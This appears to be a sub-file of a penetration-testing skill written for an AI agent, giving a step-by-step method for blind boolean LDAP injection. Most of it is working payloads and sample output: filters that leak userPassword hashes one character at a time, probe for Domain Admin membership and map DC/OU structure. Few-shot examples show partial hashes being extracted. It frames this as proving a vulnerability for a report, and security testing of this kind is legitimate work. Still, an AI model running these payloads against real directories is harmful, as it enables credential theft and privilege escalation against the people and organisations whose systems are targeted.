# LDAP Blind Boolean Extraction

## Prerequisites

- Phase 2 Step 2.5 confirmed: TRUE/FALSE payloads produce measurably different responses
- Difference >5% in length OR distinct content pattern between TRUE and FALSE
- No direct data reflection in response

**Phase context:** This is a sub-file of Phase 4 (Exploitation) in SKILL.md.

## Core Principle

When no data is visible in the response, inject filter conditions that evaluate to TRUE or FALSE and measure the difference. Ask yes/no questions about the directory — one bit at a time — to reconstruct attribute values.

**Response differentiation is your only signal. Establish it clearly before extracting.**

---

## Step 1: Establish Boolean Baseline

Before any extraction, lock in your TRUE and FALSE response signatures:

```
TRUE payload  (condition always true):
  param=admin)(|(objectClass=*)(objectClass=XXXXXXINVALID
  → Should match "valid/success" baseline

FALSE payload (condition always false):
  param=admin)(|(objectClass=XXXXXXINVALID)(objectClass=YYYYYYINVALID
  → Should match "invalid/no-result" baseline
```

Run each 5 times. Record:
```
TRUE response:  Length: {bytes}, Status: {code}, Pattern: {distinguishing content}
FALSE response: Length: {bytes}, Status: {code}, Pattern: {distinguishing content}
```

**Differentiator selection:**
- Length difference >20%? → Use length as primary signal
- Same length but different content? → Use content pattern (presence/absence of specific string)
- Timing difference? → Use as secondary confirmation only, not primary

**Q:** What if TRUE and FALSE responses look identical?
**A:** Response might be normalized. Try scoping the TRUE condition to a different attribute or target user. If still identical across 5 samples each, pivot to timing-based detection (see SKILL.md Phase 3 B4).

> **NEGATIVE VERDICT — Boolean Baseline**
>
> TRUE and FALSE payloads produce responses within 5% length difference across 5 samples each, with no consistent content pattern difference. Boolean blind extraction is not viable with current injection point.
>
> Try alternative target user in TRUE payload, or proceed to timing-based detection. If both fail, return to SKILL.md Phase 3 (Negative Verdict).

---

## Step 2: Attribute Existence Check

Before extracting values, confirm the attribute exists on the target entry:

```
Attribute exists:     param=admin)(attributeName=*
Attribute absent:     param=admin)(XXXXXXINVALIDATTR=*
```

- **Matches TRUE baseline** → Attribute exists on that entry
- **Matches FALSE baseline** → Attribute absent (or not permitted in query)

**Test common attributes in priority order:**

| Priority | Attribute | Platform | Sensitivity |
|----------|-----------|----------|------------|
| 1 | `userPassword` | OpenLDAP | CRITICAL |
| 2 | `unicodePwd` | Active Directory | CRITICAL |
| 3 | `shadowPassword` | POSIX LDAP | CRITICAL |
| 4 | `memberOf` | AD / OpenLDAP | CRITICAL |
| 5 | `mail` | Any | HIGH |
| 6 | `description` | Any | HIGH (may contain passwords) |
| 7 | `telephoneNumber` | Any | MEDIUM |
| 8 | `homeDirectory` | POSIX | MEDIUM |
| 9 | `uid` | OpenLDAP | LOW |
| 10 | `sAMAccountName` | AD | LOW |

**Stop existence checks at first CRITICAL attribute confirmed** — pivot immediately to value extraction.

---

## Step 3: Value Length Discovery

Once attribute confirmed, determine how long the value is before extracting characters:

```
Length check: param=admin)(userPassword=??????????*)
```

**LDAP doesn't have a LEN() function.** Use wildcard prefix length to infer:

```
Exact length probe — try fixed-length prefix patterns:
  param=admin)(userPassword={SSHA}???????????????????????????????????????????*)
```

**Faster approach — Test hash format prefix first:**

```
SSHA format:  param=admin)(userPassword={SSHA}*   → TRUE? SSHA confirmed
SHA format:   param=admin)(userPassword={SHA}*    → TRUE? SHA confirmed
MD5 format:   param=admin)(userPassword={MD5}*    → TRUE? MD5 confirmed
BCRYPT:       param=admin)(userPassword=$2*        → TRUE? Bcrypt confirmed
Cleartext:    param=admin)(userPassword=a*         → test a–z for first char directly
```

Knowing the format tells you the expected length and character set — dramatically reduces extraction cost.

**Common hash format lengths:**

| Format | Length | Charset |
|--------|--------|---------|
| `{SSHA}` + base64 | 48 chars of base64 | A-Za-z0-9+/= |
| `{SHA}` + base64 | 28 chars of base64 | A-Za-z0-9+/= |
| `{MD5}` + base64 | 24 chars of base64 | A-Za-z0-9+/= |
| `{BCRYPT}$2y$...` | 60 chars | A-Za-z0-9./$ |
| Cleartext | Variable | Any |

---

## Step 4: Character-by-Character Value Extraction

Extract attribute values one character at a time using wildcard prefix matching:

### Method: Wildcard Prefix

```
Position 1, test 'a':  param=admin)(userPassword=a*   → TRUE or FALSE?
Position 1, test 'b':  param=admin)(userPassword=b*   → TRUE or FALSE?
...iterate through charset until TRUE

Position 1 = 'b' (found)

Position 2, test 'a':  param=admin)(userPassword=ba*  → TRUE or FALSE?
Position 2, test 'b':  param=admin)(userPassword=bb*  → TRUE or FALSE?
...continue
```

**Optimization — reduce charset per position:**

For known hash formats, restrict charset:
```
{SSHA} base64 charset: A-Za-z0-9+/=
  → 65 possible chars per position vs full ASCII (95)
  → Binary search not directly applicable, but alphabetical order works
```

For email extraction (known format `user@domain.com`):
```
Chars before @: a-z, 0-9, ., -, _
Chars after @: a-z, 0-9, .
→ Further restricted charset
```

**Requests per character:** Average 32 (half of 65-char charset). Worst case 65 per char.

### Method: Alphabetical Binary Split

For larger charsets, split alphabet in half each request:

```
Is char in [a-m]?   param=admin)(mail=[a-m]*  → not directly supported in LDAP
```

**LDAP doesn't support range wildcards in standard filters.** Stick to character-by-character alphabetical testing. Use known-format charset restrictions to minimize requests.

---

## Step 5: Group Membership Extraction

Test whether a user belongs to specific privileged groups:

```
Domain Admins (AD):
  param=admin)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com
  → TRUE? admin is Domain Admin

Administrators (AD):
  param=admin)(memberOf=CN=Administrators,CN=Builtin,DC=corp,DC=com

Enterprise Admins (AD):
  param=admin)(memberOf=CN=Enterprise Admins,CN=Users,DC=corp,DC=com

Custom admin groups (infer from application context):
  param=admin)(memberOf=CN=IT-Admins,OU=Groups,DC=corp,DC=com
  param=admin)(memberOf=CN=SecOps,OU=Groups,DC=corp,DC=com
```

**Q:** How do I know the DN format for groups?
**A:** Infer DC= values from any LDAP error messages, TLS certificates (SAN fields), or DNS names of the target. CN= and OU= names are guesswork — try common patterns.

**To extract full DN without guessing:**

```
Step 1 — Confirm memberOf attribute exists:
  param=admin)(memberOf=*   → TRUE? attribute present

Step 2 — Extract prefix characters of first group DN:
  param=admin)(memberOf=CN=A*  → TRUE? first group starts with A
  param=admin)(memberOf=CN=B*  → TRUE? first group starts with B
  ...
```

---

## Step 6: DC/OU Structure Discovery

Map the directory structure through blind extraction:

```
DC probe:
  param=admin)(dc=corp*     → TRUE? dc=corp exists
  param=admin)(dc=com*      → TRUE? dc=com exists
  param=admin)(dc=internal* → TRUE? dc=internal exists

OU probe:
  param=admin)(ou=Users*    → TRUE? OU=Users exists
  param=admin)(ou=Admins*   → TRUE? OU=Admins exists
  param=admin)(ou=Service*  → TRUE? OU=Service exists
```

---

## Attempt Limits

| Stage | Max Requests |
|-------|-------------|
| Boolean baseline establishment | 10 (5 TRUE + 5 FALSE) |
| Attribute existence checks | 15 attributes |
| Hash format identification | 6 format probes |
| Value extraction | 32 avg per char — stop at 20 chars extracted |
| Group membership checks | 8 group DNs |
| DC/OU structure | 10 probes |

**After 20 chars of a password hash extracted → Stop. This is sufficient to prove the vulnerability.**

---

## Reasoning Format

```
[LDAP-BLIND]
[BOOLEAN-BASELINE]
  TRUE:  {payload} → Length: {x}, Pattern: {y}
  FALSE: {payload} → Length: {x}, Pattern: {y}
  [DIFFERENCE] {bytes / content / consistent?}

[EXISTENCE-CHECK]
  {attribute}=* → {TRUE / FALSE baseline match}

[FORMAT-DETECTION]
  {attr}={SSHA}* → {TRUE / FALSE}
  [FORMAT] {SSHA / SHA / MD5 / cleartext / unknown}

[EXTRACTION]
  Position 1: tested [a-z] → {char} found (TRUE at char {x})
  Position 2: tested → {char} found
  ...
  [EXTRACTED] "{partial_value}" ({N} chars)

[CONFIDENCE] {HIGH / MEDIUM}
[ACTION]     {STOP — report CRITICAL / continue to next attribute}
```

---

## Stop Conditions

| Condition | Action |
|-----------|--------|
| `userPassword` format confirmed + 8 chars extracted | **STOP.** Report CRITICAL. |
| Admin group membership confirmed | **STOP.** Report CRITICAL. |
| `description` contains cleartext credentials | **STOP.** Report CRITICAL. |
| 20+ chars of any CRITICAL attribute extracted | Report CRITICAL. Stop further extraction. |
| Rate limiting (HTTP 429) | Back off, document extracted chars so far. |
| Baseline drift detected | Re-baseline before continuing. |

---

## Few-Shot Examples

### Example 1: Password Hash Extraction — OpenLDAP SSHA

```
[LDAP-BLIND]
[BOOLEAN-BASELINE]
  TRUE:  admin)(objectClass=* → Length: 1842, Status: 200 ("Search results: 1")
  FALSE: admin)(objectClass=XXXXXXINVALID → Length: 1201, Status: 200 ("No results")
  [DIFFERENCE] 641 bytes (34%) — clear signal

[EXISTENCE-CHECK]
  userPassword=* → Length: 1842 (TRUE) ✓ — attribute exists

[FORMAT-DETECTION]
  userPassword={SSHA}* → Length: 1842 (TRUE) ✓ — SSHA format confirmed
  userPassword={SHA}*  → Length: 1201 (FALSE) — not SHA

[EXTRACTION]
  Position 1: b → TRUE, a → FALSE → char is 'b'
  Position 2: K → TRUE → char is 'K'
  Position 3: x → TRUE → char is 'x'
  ...
  [EXTRACTED] "{SSHA}bKx9mW2z" (first 12 chars extracted)

[CONFIDENCE] HIGH
[ACTION] STOP — SSHA hash confirmed extractable. Report CRITICAL.
```

### Example 2: Domain Admin Group Membership Confirmed

```
[LDAP-BLIND]
[BOOLEAN-BASELINE]
  TRUE:  jsmith)(objectClass=* → Length: 2103 ("User profile loaded")
  FALSE: jsmith)(objectClass=INVALID → Length: 987 ("User not found")

[EXISTENCE-CHECK]
  memberOf=* → Length: 2103 (TRUE) ✓

[GROUP-PROBES]
  memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com → TRUE ✓
  memberOf=CN=Enterprise Admins,CN=Users,DC=corp,DC=com → FALSE
  memberOf=CN=Administrators,CN=Builtin,DC=corp,DC=com → TRUE ✓

[VERDICT] jsmith is Domain Admin and local Administrator
[ACTION]  STOP — Report CRITICAL. Privilege escalation path confirmed.
```

### Example 3: Boolean Baseline Not Differentiable — Negative Pivot

```
[LDAP-BLIND]
[BOOLEAN-BASELINE]
  TRUE:  admin)(objectClass=* → 5 samples: 1842, 1841, 1843, 1842, 1840 bytes
  FALSE: admin)(objectClass=INVALID → 5 samples: 1839, 1842, 1841, 1840, 1842 bytes
  [DIFFERENCE] <0.2% — within baseline variance. No consistent signal.

[VERDICT] Boolean blind not viable at this injection point.
[ACTION]  Try alternative target user or return to SKILL.md Phase 3 (Negative Verdict) → timing-based (Phase 2 Step 2.4).
```
